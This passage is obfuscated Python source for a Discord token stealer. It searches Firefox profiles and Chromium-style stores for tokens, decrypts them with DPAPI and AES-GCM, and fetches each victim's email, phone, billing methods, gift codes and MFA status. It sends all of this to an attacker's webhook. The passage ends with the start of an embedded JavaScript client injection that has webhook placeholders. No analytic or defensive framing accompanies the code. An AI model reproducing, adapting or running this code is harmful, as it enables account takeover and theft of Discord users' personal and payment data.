                                if TQUSXERQNSYGUPJLCMITQYLTYEKIZAHKPQXKEWPGVFJZCPHYNTSVADINY(BWOSAKZQFNFKGXMPKRQKYZRPETIQQSZQYIPWVBOHXRYWBFVBCOKHQPDWOLDUFCEGGXVUWCTNPYLUQVAFOSCYZXLFOFGYBG, THVZQVZJDDPYAHLBXIISSHIRHVJHUAFVXJVYNWIIOURDMKZHTEBDYEWLHOSI):
                                    VJOGEKAFILMHLCPAYETLPSYNBDXNGKXJVQFATWQMUFXRZILQRRKCFEFALEKDLXAA = requests.get(THVZQVZJDDPYAHLBXIISSHIRHVJHUAFVXJVYNWIIOURDMKZHTEBDYEWLHOSI, headers={'Authorization': BWOSAKZQFNFKGXMPKRQKYZRPETIQQSZQYIPWVBOHXRYWBFVBCOKHQPDWOLDUFCEGGXVUWCTNPYLUQVAFOSCYZXLFOFGYBG}).json()['id']
                                    if VJOGEKAFILMHLCPAYETLPSYNBDXNGKXJVQFATWQMUFXRZILQRRKCFEFALEKDLXAA not in LBUDGZOTXKMHIBSGUTGTXPLPEKVAZEFTVCBXXPILCVBGMRJNNXLHZVCTROPGGA:
                                        HQHKWWOCXLEKRAYGBEODVCRPRICKKTUQZGVVQYRVKXKRJABJGGTQAZXYLVCLWHORFNTXELUKMTLQZZNHERJNKPZONUPTZGMSILVT.append(BWOSAKZQFNFKGXMPKRQKYZRPETIQQSZQYIPWVBOHXRYWBFVBCOKHQPDWOLDUFCEGGXVUWCTNPYLUQVAFOSCYZXLFOFGYBG)
                                        LBUDGZOTXKMHIBSGUTGTXPLPEKVAZEFTVCBXXPILCVBGMRJNNXLHZVCTROPGGA.append(VJOGEKAFILMHLCPAYETLPSYNBDXNGKXJVQFATWQMUFXRZILQRRKCFEFALEKDLXAA)
                                        XLWEWVOUNJXCLEPZMMZDKNKOKRJLUCISECMCADRTNMQYUJAGBFKVUGHVI[BWOSAKZQFNFKGXMPKRQKYZRPETIQQSZQYIPWVBOHXRYWBFVBCOKHQPDWOLDUFCEGGXVUWCTNPYLUQVAFOSCYZXLFOFGYBG] = (XMVERBMXSTGUQSLVWJUTQRLPTCVOKVRUBYSCZECBLFALAIIAXUVCRWGTRKUEEYRSPRJHEBUNVSHJUVGZ, f"{QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG}\\{v4r_file_name}")

        if os.path.exists(RBSDCZDAGTWTUDQFXILSLKUPJMRJSYHWKJFIKFCBPQEEFKHSVGJTTE + "\\Mozilla\\Firefox\\Profiles"):
            for QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG, _, v4r_files in os.walk(RBSDCZDAGTWTUDQFXILSLKUPJMRJSYHWKJFIKFCBPQEEFKHSVGJTTE + "\\Mozilla\\Firefox\\Profiles"):
                for v4r__file in v4r_files:
                    if v4r__file.endswith('.sqlite'):
                        with open(f'{QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG}\\{v4r__file}', errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for BWOSAKZQFNFKGXMPKRQKYZRPETIQQSZQYIPWVBOHXRYWBFVBCOKHQPDWOLDUFCEGGXVUWCTNPYLUQVAFOSCYZXLFOFGYBG in re.findall(HPRVNOAUDAOEUCQZTOZFUUICILYMGEXKCJOHRKTGMDEEQAYSIEBEFPJHJNJ, v4r_line.strip()):
                                    if TQUSXERQNSYGUPJLCMITQYLTYEKIZAHKPQXKEWPGVFJZCPHYNTSVADINY(BWOSAKZQFNFKGXMPKRQKYZRPETIQQSZQYIPWVBOHXRYWBFVBCOKHQPDWOLDUFCEGGXVUWCTNPYLUQVAFOSCYZXLFOFGYBG, THVZQVZJDDPYAHLBXIISSHIRHVJHUAFVXJVYNWIIOURDMKZHTEBDYEWLHOSI):
                                        VJOGEKAFILMHLCPAYETLPSYNBDXNGKXJVQFATWQMUFXRZILQRRKCFEFALEKDLXAA = requests.get(THVZQVZJDDPYAHLBXIISSHIRHVJHUAFVXJVYNWIIOURDMKZHTEBDYEWLHOSI, headers={'Authorization': BWOSAKZQFNFKGXMPKRQKYZRPETIQQSZQYIPWVBOHXRYWBFVBCOKHQPDWOLDUFCEGGXVUWCTNPYLUQVAFOSCYZXLFOFGYBG}).json()['id']
                                        if VJOGEKAFILMHLCPAYETLPSYNBDXNGKXJVQFATWQMUFXRZILQRRKCFEFALEKDLXAA not in LBUDGZOTXKMHIBSGUTGTXPLPEKVAZEFTVCBXXPILCVBGMRJNNXLHZVCTROPGGA:
                                            HQHKWWOCXLEKRAYGBEODVCRPRICKKTUQZGVVQYRVKXKRJABJGGTQAZXYLVCLWHORFNTXELUKMTLQZZNHERJNKPZONUPTZGMSILVT.append(BWOSAKZQFNFKGXMPKRQKYZRPETIQQSZQYIPWVBOHXRYWBFVBCOKHQPDWOLDUFCEGGXVUWCTNPYLUQVAFOSCYZXLFOFGYBG)
                                            LBUDGZOTXKMHIBSGUTGTXPLPEKVAZEFTVCBXXPILCVBGMRJNNXLHZVCTROPGGA.append(VJOGEKAFILMHLCPAYETLPSYNBDXNGKXJVQFATWQMUFXRZILQRRKCFEFALEKDLXAA)
                                            XLWEWVOUNJXCLEPZMMZDKNKOKRJLUCISECMCADRTNMQYUJAGBFKVUGHVI[BWOSAKZQFNFKGXMPKRQKYZRPETIQQSZQYIPWVBOHXRYWBFVBCOKHQPDWOLDUFCEGGXVUWCTNPYLUQVAFOSCYZXLFOFGYBG] = ('Firefox', f"{QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG}\\{v4r__file}")
        return HQHKWWOCXLEKRAYGBEODVCRPRICKKTUQZGVVQYRVKXKRJABJGGTQAZXYLVCLWHORFNTXELUKMTLQZZNHERJNKPZONUPTZGMSILVT, XLWEWVOUNJXCLEPZMMZDKNKOKRJLUCISECMCADRTNMQYUJAGBFKVUGHVI

    def TQUSXERQNSYGUPJLCMITQYLTYEKIZAHKPQXKEWPGVFJZCPHYNTSVADINY(BWOSAKZQFNFKGXMPKRQKYZRPETIQQSZQYIPWVBOHXRYWBFVBCOKHQPDWOLDUFCEGGXVUWCTNPYLUQVAFOSCYZXLFOFGYBG, THVZQVZJDDPYAHLBXIISSHIRHVJHUAFVXJVYNWIIOURDMKZHTEBDYEWLHOSI):
        return requests.get(THVZQVZJDDPYAHLBXIISSHIRHVJHUAFVXJVYNWIIOURDMKZHTEBDYEWLHOSI, headers={'Authorization': BWOSAKZQFNFKGXMPKRQKYZRPETIQQSZQYIPWVBOHXRYWBFVBCOKHQPDWOLDUFCEGGXVUWCTNPYLUQVAFOSCYZXLFOFGYBG}).status_code == 200

    def UCAQXCUKNZITJPNDAVPSNLJZVQZQNICPJKLXONRQTBNYLMZSEACESTGVRLJLLAARKYTDOARQRFCNQKVDMMWDQBTPRANNWJKTBWHQVal(BTBWQEPJCBZYLUVXFFCUAGICIDUGRGYPTYMETUONRSJHHRZRYMXERMUOIGK, NMNVJJNDGSKSOFRJWRDKHOVTZEQZCVOWETHYZWYPJHWXPTSGROIXPEHWEBHPAHNFZXBU):
        ULCMLKXALDGBNXBYCKLALSZQMALYHUVFPTCBMGPYLGNGULWQDLORSDHQFONGUXHTWWPLUKHGSVVLXOUKY = BTBWQEPJCBZYLUVXFFCUAGICIDUGRGYPTYMETUONRSJHHRZRYMXERMUOIGK[3:15]
        SBIBKQUUCWULEWXHXOEDIVZQPGNNPOWTLBAUVYFRWFFVLPCTJPCKUCOKSMXITICRWEVFDVRJBFAJIHWZVTEWYZSBDBJYLUGLEO = BTBWQEPJCBZYLUVXFFCUAGICIDUGRGYPTYMETUONRSJHHRZRYMXERMUOIGK[15:]
        EJCKAWSSHKJZJMWIPDIXJHYUKIJBFWCDDCSBCXLJNNTQAVFGSOUBHNFQRTPULOLEFUBKXOKWTEATCAWYXDDCMJKOZSME = AES.new(NMNVJJNDGSKSOFRJWRDKHOVTZEQZCVOWETHYZWYPJHWXPTSGROIXPEHWEBHPAHNFZXBU, AES.MODE_GCM, ULCMLKXALDGBNXBYCKLALSZQMALYHUVFPTCBMGPYLGNGULWQDLORSDHQFONGUXHTWWPLUKHGSVVLXOUKY)
        return EJCKAWSSHKJZJMWIPDIXJHYUKIJBFWCDDCSBCXLJNNTQAVFGSOUBHNFQRTPULOLEFUBKXOKWTEATCAWYXDDCMJKOZSME.decrypt(SBIBKQUUCWULEWXHXOEDIVZQPGNNPOWTLBAUVYFRWFFVLPCTJPCKUCOKSMXITICRWEVFDVRJBFAJIHWZVTEWYZSBDBJYLUGLEO)[:-16].decode()

    def WUQSGLSEJEDQENBHHOBLAIETSREYKLDAKZDSUFAPPBVMGANDXASOGDHSCKZQCPPTRNHLKZRYVDOLQVNYBVSFTEHYKBA(QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG):
        if not os.path.exists(QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG):
            return None
        with open(QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG, "r", encoding="utf-8") as v4r_f:
            EWQYVONLUIGJAWEERKVERJRNXVXVTNSLWTBRTNWRYHOZCRTTWHXUYYLNIVJGKRFPT = json.load(v4r_f)
        NMNVJJNDGSKSOFRJWRDKHOVTZEQZCVOWETHYZWYPJHWXPTSGROIXPEHWEBHPAHNFZXBU = base64.b64decode(EWQYVONLUIGJAWEERKVERJRNXVXVTNSLWTBRTNWRYHOZCRTTWHXUYYLNIVJGKRFPT["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(NMNVJJNDGSKSOFRJWRDKHOVTZEQZCVOWETHYZWYPJHWXPTSGROIXPEHWEBHPAHNFZXBU, None, None, None, 0)[1]

    HQHKWWOCXLEKRAYGBEODVCRPRICKKTUQZGVVQYRVKXKRJABJGGTQAZXYLVCLWHORFNTXELUKMTLQZZNHERJNKPZONUPTZGMSILVT, XLWEWVOUNJXCLEPZMMZDKNKOKRJLUCISECMCADRTNMQYUJAGBFKVUGHVI = MWIPFWJGWOUQUSRUKFXTZLRTCGTJPILPNVLZDKOALSHNMOPFISESSVVL()
    WLHRXEDAGMBMGRJWJZWIOUWHVZXPPWSJTJLUPJPLTXBBPYHLJIQ = SyncWebhook.from_url(MMYEKZMRKBSJGZQBUCBLHWMRTMRCPCRTXUGBXUXZYEJYSRERZMQKDCEHHEVWCBCVBIHTDQQVKHX)

    if not HQHKWWOCXLEKRAYGBEODVCRPRICKKTUQZGVVQYRVKXKRJABJGGTQAZXYLVCLWHORFNTXELUKMTLQZZNHERJNKPZONUPTZGMSILVT:
        NSOGKUFJECAHAHGZSSJSSQWJIKNVJHYQGCLUHVTPZWQBGZGOMPOKNROLOZNHXIWC(
            MMYEKZMRKBSJGZQBUCBLHWMRTMRCPCRTXUGBXUXZYEJYSRERZMQKDCEHHEVWCBCVBIHTDQQVKHX, 
            title=f'Discord Token {SSKHZDLRNGSSIMEUEDTUYTPURKATDZYJIBJGYNZNNMJLTOXPPOGSXUNCIJDJNVKUXFNUNEFTOOGEGIMFZRVSMYXMRBUQPQPROB}:', 
            description=f"No discord tokens found."
        )
        return
    
    for BWOSAKZQFNFKGXMPKRQKYZRPETIQQSZQYIPWVBOHXRYWBFVBCOKHQPDWOLDUFCEGGXVUWCTNPYLUQVAFOSCYZXLFOFGYBG_d15c0rd in HQHKWWOCXLEKRAYGBEODVCRPRICKKTUQZGVVQYRVKXKRJABJGGTQAZXYLVCLWHORFNTXELUKMTLQZZNHERJNKPZONUPTZGMSILVT:
        HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': BWOSAKZQFNFKGXMPKRQKYZRPETIQQSZQYIPWVBOHXRYWBFVBCOKHQPDWOLDUFCEGGXVUWCTNPYLUQVAFOSCYZXLFOFGYBG_d15c0rd}).json()

        PMJOBIWQBKRGYGCEOEILMEXZGXTBPDTQGOUAAJMWTHMWTUCHVPODEJDRGJSUCKOVJNMDRRPXLJLJJDZEHGXCMRFNYVDAZ = HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ.get('username', "None") + '#' + HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ.get('discriminator', "None")
        VVCKIJVDYKIJTIOJWPNMMFSASJORVTVNZALGKSGYKUUSYRTFVXJGHCNWGMOBQMEYDDOQKZSRJZG = HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ.get('global_name', "None")
        OMMZASTDCUKFUJHHAFQRZJBQOACQTMFMJUKLPMOFVXXBIHJFPIVXZGK = HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ.get('id', "None")
        YQINQUUXWJWDIXVRVIVJRIJFKTEJIFECWVPOWXRIPGWJVQMDIXOHWNZIMQYFLCNTYPYGNGLQJQNUOQDVHVKIVHUBOAGSCAGE = HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ.get('email', "None")
        MIXBFDHNZBPTNHNFOQYMNAHKXTVRFTEYOUZQRWXEACTHYABLCXSLDMCKNCSF = HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ.get('verified', "None")
        MMHNWMEUTGCSVKCEVFODHOGZWFFWCTVQJTKALDAXXTSCHRBTHDVCBBFOYOIMMPSMVDSKYQIYOLWN = HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ.get('phone', "None")
        CGIOBGMDIQEFDGIGEASTTXDTFOUMHDLWAVKEQDDYGLLWQJVQKGTUXSFAYKNPRIBGBGLGITGLZDEJ = HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ.get('locale', "None")
        YNMWEKCEEFBRFOJHLADKSAESZWYPETCSCNFICJXKVNAFZZKVYUKXSEPTYRBLQUPIITAQTBOJNZVYHNHGPJZBADKVTNTKVK = HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ.get('mfa_enabled', "None")

        try:
            if HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ.get('premium_type', 'None') == 0:
                IBIHWJJLJXDSMBAOHJCATANUSPZQPHTQREKJFMOSZJBWOFRVMXWUVOBBWLMNRMRUXJKMZ = 'False'
            elif HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ.get('premium_type', 'None') == 1:
                IBIHWJJLJXDSMBAOHJCATANUSPZQPHTQREKJFMOSZJBWOFRVMXWUVOBBWLMNRMRUXJKMZ = 'Nitro Classic'
            elif HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ.get('premium_type', 'None') == 2:
                IBIHWJJLJXDSMBAOHJCATANUSPZQPHTQREKJFMOSZJBWOFRVMXWUVOBBWLMNRMRUXJKMZ = 'Nitro Boosts'
            elif HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ.get('premium_type', 'None') == 3:
                IBIHWJJLJXDSMBAOHJCATANUSPZQPHTQREKJFMOSZJBWOFRVMXWUVOBBWLMNRMRUXJKMZ = 'Nitro Basic'
            else:
                IBIHWJJLJXDSMBAOHJCATANUSPZQPHTQREKJFMOSZJBWOFRVMXWUVOBBWLMNRMRUXJKMZ = 'False'
        except:
            IBIHWJJLJXDSMBAOHJCATANUSPZQPHTQREKJFMOSZJBWOFRVMXWUVOBBWLMNRMRUXJKMZ = "None"

        try: 
            BTJIMTFXUDKPUXZQTPRAXFFLVSBYQTBCNCQWQBKKIZHZUAJAXOQAWLPNSFMYORULZDCSEMBIELIWEGDMGONYMBZLTV = f"https://cdn.discordapp.com/avatars/{OMMZASTDCUKFUJHHAFQRZJBQOACQTMFMJUKLPMOFVXXBIHJFPIVXZGK}/{HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{OMMZASTDCUKFUJHHAFQRZJBQOACQTMFMJUKLPMOFVXXBIHJFPIVXZGK}/{HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{OMMZASTDCUKFUJHHAFQRZJBQOACQTMFMJUKLPMOFVXXBIHJFPIVXZGK}/{HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ['avatar']}.png"
        except: 
            BTJIMTFXUDKPUXZQTPRAXFFLVSBYQTBCNCQWQBKKIZHZUAJAXOQAWLPNSFMYORULZDCSEMBIELIWEGDMGONYMBZLTV = CXSOUFNGUAAONNKBBBLJRFERXZPMOFCYLKEMUHOPOGMLRNLRIPXXCQYJOXGIFSDYVEGZHPXSUNOXI

        try:
            IPATMLBFOHYXGGRTAGAGYCMWWMKFYNUPBINZNRMPVRLKXFBBLFQTG = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': BWOSAKZQFNFKGXMPKRQKYZRPETIQQSZQYIPWVBOHXRYWBFVBCOKHQPDWOLDUFCEGGXVUWCTNPYLUQVAFOSCYZXLFOFGYBG_d15c0rd}).json()
            if IPATMLBFOHYXGGRTAGAGYCMWWMKFYNUPBINZNRMPVRLKXFBBLFQTG:
                RSUJFOTGCNMCVYISPIPCQWWQELZARLYCKYSGVDCTWESGKABBJQRCXNEYTIDBVZUITPTJNMBNOKBFYBZDRVX = []

                for v4r_method in IPATMLBFOHYXGGRTAGAGYCMWWMKFYNUPBINZNRMPVRLKXFBBLFQTG:
                    if v4r_method['type'] == 1:
                        RSUJFOTGCNMCVYISPIPCQWWQELZARLYCKYSGVDCTWESGKABBJQRCXNEYTIDBVZUITPTJNMBNOKBFYBZDRVX.append('CB')
                    elif v4r_method['type'] == 2:
                        RSUJFOTGCNMCVYISPIPCQWWQELZARLYCKYSGVDCTWESGKABBJQRCXNEYTIDBVZUITPTJNMBNOKBFYBZDRVX.append("Paypal")
                    else:
                        RSUJFOTGCNMCVYISPIPCQWWQELZARLYCKYSGVDCTWESGKABBJQRCXNEYTIDBVZUITPTJNMBNOKBFYBZDRVX.append('Other')
                RSUJFOTGCNMCVYISPIPCQWWQELZARLYCKYSGVDCTWESGKABBJQRCXNEYTIDBVZUITPTJNMBNOKBFYBZDRVX = ' / '.join(RSUJFOTGCNMCVYISPIPCQWWQELZARLYCKYSGVDCTWESGKABBJQRCXNEYTIDBVZUITPTJNMBNOKBFYBZDRVX)
            else:
                RSUJFOTGCNMCVYISPIPCQWWQELZARLYCKYSGVDCTWESGKABBJQRCXNEYTIDBVZUITPTJNMBNOKBFYBZDRVX = "None"
        except:
            RSUJFOTGCNMCVYISPIPCQWWQELZARLYCKYSGVDCTWESGKABBJQRCXNEYTIDBVZUITPTJNMBNOKBFYBZDRVX = "None"

        try:
            AOTPRJSVSSKQWCVSGHXUGWQVFCWBEQOYHRQJATFYCWUFYJIVYYPLOIUHVETWUMKRSRPCOAJRPLPMBOFNWZMKDLOIXEGPMLM = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': BWOSAKZQFNFKGXMPKRQKYZRPETIQQSZQYIPWVBOHXRYWBFVBCOKHQPDWOLDUFCEGGXVUWCTNPYLUQVAFOSCYZXLFOFGYBG_d15c0rd}).json()
            if AOTPRJSVSSKQWCVSGHXUGWQVFCWBEQOYHRQJATFYCWUFYJIVYYPLOIUHVETWUMKRSRPCOAJRPLPMBOFNWZMKDLOIXEGPMLM:
                LBKOWGPPTLPSEJNJQJDAVYXLYPOIQTRLZUVEVFJFFQIHMVWTIDRQPLFITJVCNGTPQTNVFFCZZGRUEJRVEMHKVZJI = []
                for EBEGNECXAUMIZFJQOXTNMSBTOWJGPZLDWJIEOWLXNFRFKWJPUOQJAZTKNJTKRT in AOTPRJSVSSKQWCVSGHXUGWQVFCWBEQOYHRQJATFYCWUFYJIVYYPLOIUHVETWUMKRSRPCOAJRPLPMBOFNWZMKDLOIXEGPMLM:
                    XMVERBMXSTGUQSLVWJUTQRLPTCVOKVRUBYSCZECBLFALAIIAXUVCRWGTRKUEEYRSPRJHEBUNVSHJUVGZ = EBEGNECXAUMIZFJQOXTNMSBTOWJGPZLDWJIEOWLXNFRFKWJPUOQJAZTKNJTKRT['promotion']['outbound_title']
                    EBEGNECXAUMIZFJQOXTNMSBTOWJGPZLDWJIEOWLXNFRFKWJPUOQJAZTKNJTKRT = EBEGNECXAUMIZFJQOXTNMSBTOWJGPZLDWJIEOWLXNFRFKWJPUOQJAZTKNJTKRT['code']
                    AYMCCFAQXOFYYKSENGUBXRLMZOERSNWUGCOECQOIWBRBHIXIRXY = f"Gift: {XMVERBMXSTGUQSLVWJUTQRLPTCVOKVRUBYSCZECBLFALAIIAXUVCRWGTRKUEEYRSPRJHEBUNVSHJUVGZ}\nCode: {EBEGNECXAUMIZFJQOXTNMSBTOWJGPZLDWJIEOWLXNFRFKWJPUOQJAZTKNJTKRT}"
                    if len('\n\n'.join(EBEGNECXAUMIZFJQOXTNMSBTOWJGPZLDWJIEOWLXNFRFKWJPUOQJAZTKNJTKRT)) + len(AYMCCFAQXOFYYKSENGUBXRLMZOERSNWUGCOECQOIWBRBHIXIRXY) >= 1024:
                        break
                    LBKOWGPPTLPSEJNJQJDAVYXLYPOIQTRLZUVEVFJFFQIHMVWTIDRQPLFITJVCNGTPQTNVFFCZZGRUEJRVEMHKVZJI.append(AYMCCFAQXOFYYKSENGUBXRLMZOERSNWUGCOECQOIWBRBHIXIRXY)
                if len(LBKOWGPPTLPSEJNJQJDAVYXLYPOIQTRLZUVEVFJFFQIHMVWTIDRQPLFITJVCNGTPQTNVFFCZZGRUEJRVEMHKVZJI) > 0:
                    EBEGNECXAUMIZFJQOXTNMSBTOWJGPZLDWJIEOWLXNFRFKWJPUOQJAZTKNJTKRT = '\n\n'.join(LBKOWGPPTLPSEJNJQJDAVYXLYPOIQTRLZUVEVFJFFQIHMVWTIDRQPLFITJVCNGTPQTNVFFCZZGRUEJRVEMHKVZJI)
                else:
                    EBEGNECXAUMIZFJQOXTNMSBTOWJGPZLDWJIEOWLXNFRFKWJPUOQJAZTKNJTKRT = "None"
            else:
                EBEGNECXAUMIZFJQOXTNMSBTOWJGPZLDWJIEOWLXNFRFKWJPUOQJAZTKNJTKRT = "None"
        except:
            EBEGNECXAUMIZFJQOXTNMSBTOWJGPZLDWJIEOWLXNFRFKWJPUOQJAZTKNJTKRT = "None"
    
        v4r_software_name, QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG = XLWEWVOUNJXCLEPZMMZDKNKOKRJLUCISECMCADRTNMQYUJAGBFKVUGHVI.get(BWOSAKZQFNFKGXMPKRQKYZRPETIQQSZQYIPWVBOHXRYWBFVBCOKHQPDWOLDUFCEGGXVUWCTNPYLUQVAFOSCYZXLFOFGYBG_d15c0rd, ("Unknown Software", "Unknown location"))

        embed = Embed(title=f'Discord Token {SSKHZDLRNGSSIMEUEDTUYTPURKATDZYJIBJGYNZNNMJLTOXPPOGSXUNCIJDJNVKUXFNUNEFTOOGEGIMFZRVSMYXMRBUQPQPROB}:', color=DNELUTIPWJOZTULOMFHJWJJZAFVXALFGOVGTTHOTYCMNDYPADROGVNVBFJXRN)      
        embed.add_field(name=":file_folder: Path:", value=f"```{QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG}```", inline=True)
        embed.add_field(name=":globe_with_meridians: Token:", value=f"```{BWOSAKZQFNFKGXMPKRQKYZRPETIQQSZQYIPWVBOHXRYWBFVBCOKHQPDWOLDUFCEGGXVUWCTNPYLUQVAFOSCYZXLFOFGYBG_d15c0rd}```", inline=True)
        embed.add_field(name=":package: Software:", value=f"```{v4r_software_name}```", inline=True)
        embed.add_field(name=":bust_in_silhouette: Username:", value=f"```{PMJOBIWQBKRGYGCEOEILMEXZGXTBPDTQGOUAAJMWTHMWTUCHVPODEJDRGJSUCKOVJNMDRRPXLJLJJDZEHGXCMRFNYVDAZ}```", inline=True)
        embed.add_field(name=":bust_in_silhouette: Display Name:", value=f"```{VVCKIJVDYKIJTIOJWPNMMFSASJORVTVNZALGKSGYKUUSYRTFVXJGHCNWGMOBQMEYDDOQKZSRJZG}```", inline=True)
        embed.add_field(name=":robot: Id:", value=f"```{OMMZASTDCUKFUJHHAFQRZJBQOACQTMFMJUKLPMOFVXXBIHJFPIVXZGK}```", inline=True)
        embed.add_field(name=":e_mail: Email:", value=f"```{YQINQUUXWJWDIXVRVIVJRIJFKTEJIFECWVPOWXRIPGWJVQMDIXOHWNZIMQYFLCNTYPYGNGLQJQNUOQDVHVKIVHUBOAGSCAGE}```", inline=True)
        embed.add_field(name=":white_check_mark: Email Verified:", value=f"```{MIXBFDHNZBPTNHNFOQYMNAHKXTVRFTEYOUZQRWXEACTHYABLCXSLDMCKNCSF}```", inline=True)
        embed.add_field(name=":telephone_receiver: Phone:", value=f"```{MMHNWMEUTGCSVKCEVFODHOGZWFFWCTVQJTKALDAXXTSCHRBTHDVCBBFOYOIMMPSMVDSKYQIYOLWN}```", inline=True)   
        embed.add_field(name=":rocket: Nitro:", value=f"```{IBIHWJJLJXDSMBAOHJCATANUSPZQPHTQREKJFMOSZJBWOFRVMXWUVOBBWLMNRMRUXJKMZ}```", inline=True)
        embed.add_field(name=":earth_africa: Language:", value=f"```{CGIOBGMDIQEFDGIGEASTTXDTFOUMHDLWAVKEQDDYGLLWQJVQKGTUXSFAYKNPRIBGBGLGITGLZDEJ}```", inline=True)
        embed.add_field(name=":moneybag: Billing:", value=f"```{RSUJFOTGCNMCVYISPIPCQWWQELZARLYCKYSGVDCTWESGKABBJQRCXNEYTIDBVZUITPTJNMBNOKBFYBZDRVX}```", inline=True)
        embed.add_field(name=":gift: Gift Code:", value=f"```{EBEGNECXAUMIZFJQOXTNMSBTOWJGPZLDWJIEOWLXNFRFKWJPUOQJAZTKNJTKRT}```", inline=True)
        embed.add_field(name=":lock: Multi-Factor Authentication:", value=f"```{YNMWEKCEEFBRFOJHLADKSAESZWYPETCSCNFICJXKVNAFZZKVYUKXSEPTYRBLQUPIITAQTBOJNZVYHNHGPJZBADKVTNTKVK}```", inline=True)
        embed.add_field(name=":frame_photo: Profile Picture:", value=f"", inline=False)
        embed.set_image(url=BTJIMTFXUDKPUXZQTPRAXFFLVSBYQTBCNCQWQBKKIZHZUAJAXOQAWLPNSFMYORULZDCSEMBIELIWEGDMGONYMBZLTV)
        embed.set_footer(text=VESUBNJMUJUISETCMMULDLVANAOHCUJNNPPZZGWNXHHOWJTLXDHVREXNPRYKFTLEOQRIDGRTNFKWSHEYECXVDJMQ, icon_url=CXSOUFNGUAAONNKBBBLJRFERXZPMOFCYLKEMUHOPOGMLRNLRIPXXCQYJOXGIFSDYVEGZHPXSUNOXI)
        WLHRXEDAGMBMGRJWJZWIOUWHVZXPPWSJTJLUPJPLTXBBPYHLJIQ.send(embed=embed, username=LMRAEHHWDRLRJFXVQBVICRAQPOCOVBBOLNBRUAOGUGDKOMAHPTNYFEGZRVQDWHXOVMUFXGZRSUEBDCIH, avatar_url=CXSOUFNGUAAONNKBBBLJRFERXZPMOFCYLKEMUHOPOGMLRNLRIPXXCQYJOXGIFSDYVEGZHPXSUNOXI)

LSUZDQIHROGYOYCMPPFVERKZYARSGDYSTHSQRAJAPMPEQIURSNVISONZVU = r"""
const args = process.argv;
const fs = require('fs');
const path = require('path');
const https = require('https');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron');

const config = {
  webhook: '%WEBHOOK_HERE%', 
  webhook_protector_key: '%WEBHOOK_KEY%', 
  auto_buy_nitro: false, 
  ping_on_run: true, 
  ping_val: '@everyone',
  ip_address_public: '%IP_PUBLIC%',
  username: '%USERNAME%',
  embed_name: '%EMBED_NAME%', 
  embed_icon: '%EMBED_ICON%'.replace(/ /g, '%20'), 
  footer_text: '%FOOTER_TEXT%',
  embed_color: %EMBED_COLOR%, 
  injection_url: '', 
  api: 'https://discord.com/api/v9/users/@me',
  nitro: {
    boost: {
      year: {
        id: '521847234246082599',
        sku: '511651885459963904',
        price: '9999',
      },
      month: {
        id: '521847234246082599',
        sku: '511651880837840896',
        price: '999',
      },
    },
